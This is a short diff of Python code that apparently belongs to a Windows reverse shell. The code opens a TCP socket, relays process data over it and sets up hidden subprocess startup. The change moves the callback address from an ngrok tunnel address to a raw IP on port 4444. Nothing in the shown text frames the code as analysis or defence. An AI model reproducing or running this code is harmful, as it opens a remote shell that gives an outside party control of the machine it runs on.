@@ -16,7 +16,7 @@ def process_to_socket(s, p):
         s.send(data)
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(('7.tcp.eu.ngrok.io', 15188))
+s.connect(('34.163.206.43', 4444))
 
 if s.fileno() != -1:
     startupinfo = subprocess.STARTUPINFO()
